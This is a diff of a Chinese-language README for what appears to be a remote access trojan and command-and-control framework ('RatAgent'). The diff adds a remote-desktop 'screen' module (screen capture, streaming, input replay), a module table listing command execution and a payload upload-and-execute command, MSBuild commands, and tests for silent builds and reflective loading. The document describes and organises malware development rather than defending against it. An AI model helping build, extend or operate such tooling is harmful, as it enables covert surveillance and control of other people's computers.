@@ -37,6 +37,7 @@ c2/
 │   ├── RatAgentDll.vcxproj    # → RatAgent.dll（rundll32 / 宿主 / 注入；静态 CRT）
 │   ├── caps_full.cpp          # "full"模块的能力清单（每个模块工程一份）
 │   ├── agents/_template/      # **模块工程模板**：复制它开新模块（见其 README）
+│   ├── agents/screen/         # "screen"（远程桌面）模块：抓屏/屏幕流/输入回放/桌面切换
 │   └── core/                  # protocol/crypto/net/session/cmd_dispatch/capability
 │                              # + agent_runtime(共用运行核心) / agent_dll(导出) / main(EXE 入口)
 │                              # + module_id(模块命名空间) / agent_debug(诊断开关)
@@ -120,11 +121,27 @@ LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → 
 ::    轮询 5s；<module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
 ```
 
+### 模块清单与拆分现状
+
+同一份 `client/core` 可以编成多个**模块 agent**（每个模块是一个独立进程、**直连 C2**）。
+模块之间不需要插件 ABI/加载器：新增能力 = 复制 [client/agents/_template](client/agents/_template/)
++ 在自己的 `caps.cpp` 里登记指令。
+
+| 模块 | 产物 | 能力（能力位） | 说明 |
+|---|---|---|---|
+| `full` | `RatAgent.exe` / `RatAgent.dll` | `bit0` 系统类 | sysinfo / exec / payload（由 core 内置处理） |
+| `screen` | `RatAgent.screen.exe` / `RatAgent.screen.dll` | `bit1` 远程桌面 | 抓屏 `0x1001` / 屏幕流 `0x1002` / 输入回放（数据走 4445 中继）；源码在 [client/agents/screen](client/agents/screen/) |
+| `template` | `RatAgent.template.exe` / `.dll` | `bit0` | 工程模板（自带 `0x2001` 示例指令），复制它开新模块 |
+
+> **拆分带来的行为变化**：`screenshot`（0x1001）与屏幕流（0x1002）现在由 **`screen` 模块**提供，
+> `full` 模块收到这两个指令会返回未知指令（`status=0x01`）。操作时先 `sessions` 看标签
+> （`Windows (screen)`），再用 **`use screen`**（支持按模块标签解析）切到它。
+> viewer 的拉流配对逻辑不变（帧仍发给"发起 `0x1002` 的那条 ctl 连接"）。
+
 ### 模块命名空间（同机多模块共存）
 
-同一份 `client/core` 可以编成多个**模块 agent**（`full` / `screen` / …）。它们在同一台机器上
-共存时各有自己的落盘物与 C2 侧标识——这是共存的**前提**，因为服务器按 `agent_id` 索引，
-`Registry.Register` 遇到 id 冲突会**踢掉旧会话**（两个模块共用一份 id 就会互相踢下线）：
+多个模块在同一台机器上共存时各有自己的落盘物与 C2 侧标识——这是共存的**前提**，因为服务器按
+`agent_id` 索引，`Registry.Register` 遇到 id 冲突会**踢掉旧会话**（两个模块共用一份 id 就会互相踢下线）：
 
 | 项 | 规则 |
 |---|---|
@@ -138,6 +155,9 @@ LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → 
 :: 同一工程出不同模块（默认 full；新模块工程应把这两个值写死成自己的）
 "%MSBUILD%" client/RatAgent.vcxproj -p:Configuration=Release -p:Platform=x64 ^
     -p:RatAgentModuleId=probe "-p:RatAgentModuleCaps=(c2::kCapSys)" ...
+
+:: 屏幕模块（它有自己的工程）
+"%MSBUILD%" client/agents/screen/RatAgent.screen.exe.vcxproj -p:Configuration=Release -p:Platform=x64 ...
 ```
 
 > ⚠ 已知缺口：**beacon 信道的会话在服务端是硬编码 `OSInfo="beacon-agent"` 的**，握手元数据
@@ -212,7 +232,9 @@ payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
 ```
 
 4. 自动验收：`python scripts/e2e_m3.py`（beacon + ratctl）、`python scripts/e2e_m4.py`（屏幕流）、
-   `python scripts/e2e_rdll.py`（反射加载：需先有 `build/e2e/out.bin`，见 `docs/PROGRESS.md` §8.5）
+   `python scripts/e2e_rdll.py`（反射加载：需先有 `build/e2e/out.bin`，见 `docs/PROGRESS.md` §8.5）、
+   `python scripts/e2e_quiet.py`（静默构建）、`python scripts/e2e_modules.py`（模块命名空间共存）、
+   `python scripts/e2e_template.py`（模块模板）、`python scripts/e2e_screen.py`（远程桌面模块，阶段 2）
 
 ## 协议要点
 
